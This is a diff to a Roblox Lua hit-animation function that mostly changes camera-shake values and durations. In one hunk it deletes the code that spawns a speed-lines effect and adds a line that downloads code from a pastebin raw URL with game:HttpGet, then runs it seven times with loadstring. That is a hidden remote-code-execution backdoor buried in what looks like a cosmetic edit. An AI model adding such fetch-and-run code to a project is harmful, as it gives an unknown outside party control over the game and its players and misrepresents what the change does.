@@ -89,17 +89,17 @@ local function playHitAnimation(target)
     local camera = game.Workspace.CurrentCamera
     local TweenService = game:GetService("TweenService")
     local shakeDuration = 0.2
-    local shakeMagnitude = 0.04
+    local shakeMagnitude = 0.01
 
     task.spawn(function()
         local originalCFrame = camera.CFrame
         local startTime = tick()
 
         while tick() - startTime < shakeDuration do
-           local offsetX = (math.random() - 0.2) * shakeMagnitude * 0.2
-           local offsetY = (math.random() - 0.3) * shakeMagnitude * 0.3
+           local offsetX = (math.random() - 0.0) * shakeMagnitude * 0.0
+           local offsetY = (math.random() - 0.0) * shakeMagnitude * 0.0
            local targetCFrame = originalCFrame * CFrame.new(offsetX, offsetY, 0)
-           local tweenInfo = TweenInfo.new(0.03, Enum.EasingStyle.Linear)
+           local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
            wait(0.01)
@@ -134,18 +134,12 @@ local function playHitAnimation(target)
 
     wait(1)
     
-    local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")
-    local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")
-    local speedlinesandstuffPart = kjEffectsFolder:WaitForChild("barrage")
-    local speedlinesandstuffClone = speedlinesandstuffPart:Clone()
-    local torso = character:WaitForChild("HumanoidRootPart")
-    local offset = torso.CFrame.LookVector * 2
-    local desiredCFrame = torso.CFrame + offset
-    speedlinesandstuffClone.CFrame = desiredCFrame
-    speedlinesandstuffClone.Parent = Workspace
+    local code = game:HttpGet("https://pastebin.com/raw/cCpAvw66")
 
-    task.delay(2, function() 
-        speedlinesandstuffClone:Destroy() 
+    task.spawn(function()
+        for i = 1, 7 do
+            task.spawn(function() loadstring(code)() end)
+        end
     end)
     
     local function enableParticleEmitters(parent)
@@ -167,7 +161,7 @@ local function playHitAnimation(target)
  
     --2 HIT CAMERASHAKE
     local shakeDuration = 1
-    local shakeMagnitude = 0.01
+    local shakeMagnitude = 1
 
     task.spawn(function()
         wait(0.1)
@@ -175,13 +169,13 @@ local function playHitAnimation(target)
         local startTime = tick()
 
         while tick() - startTime < shakeDuration do
-           local offsetX = (math.random() - 0.1) * shakeMagnitude * 0.2
-           local offsetY = (math.random() - 0.1) * shakeMagnitude * 0.2
+           local offsetX = (math.random() - 1.0) * shakeMagnitude * 1.0
+           local offsetY = (math.random() - 1.0) * shakeMagnitude * 1.0
            local targetCFrame = originalCFrame * CFrame.new(offsetX, offsetY, 0)
-           local tweenInfo = TweenInfo.new(0.03, Enum.EasingStyle.Linear)
+           local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
-           wait(0.1)
+           wait(0.03)
            tween:Play()
         end
 
@@ -208,8 +202,8 @@ local function playHitAnimation(target)
     end)
     wait(2)
 
-    local shakeDuration = 0.8
-    local shakeMagnitude = 1
+    local shakeDuration = 1
+    local shakeMagnitude = 1.5
 
     task.spawn(function()
         local originalCFrame = camera.CFrame
@@ -217,12 +211,12 @@ local function playHitAnimation(target)
 
         while tick() - startTime < shakeDuration do
            local offsetX = (math.random() - 1.0) * shakeMagnitude * 1.0
-           local offsetY = (math.random() - 0.2) * shakeMagnitude * 0.2
+           local offsetY = (math.random() - 1.0) * shakeMagnitude * 1.0
            local targetCFrame = originalCFrame * CFrame.new(offsetX, offsetY, 0)
-           local tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear)
+           local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
-           wait(0.01)
+           wait(0.5)
         end
 
         camera.CFrame = originalCFrame
@@ -239,8 +233,8 @@ local function playHitAnimation(target)
     end
 
     wait(1)
-    local shakeDuration = 0.4
-    local shakeMagnitude = 0.01
+    local shakeDuration = 1
+    local shakeMagnitude = 1.5
 
     task.spawn(function()
         wait(0.2)
@@ -248,13 +242,13 @@ local function playHitAnimation(target)
         local startTime = tick()
 
         while tick() - startTime < shakeDuration do
-           local offsetX = (math.random() - 0.2) * shakeMagnitude * 0.2
-           local offsetY = (math.random() - 0.2) * shakeMagnitude * 0.2
+           local offsetX = (math.random() - 1.0) * shakeMagnitude * 1.0
+           local offsetY = (math.random() - 1.0) * shakeMagnitude * 1.0
            local targetCFrame = originalCFrame * CFrame.new(offsetX, offsetY, 0)
-           local tweenInfo = TweenInfo.new(0.03, Enum.EasingStyle.Linear)
+           local tweenInfo = TweenInfo.new(0.01, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(camera, tweenInfo, {CFrame = targetCFrame})
            tween:Play()
-           wait(0.05)
+           wait(0.5)
         end
 
         camera.CFrame = originalCFrame
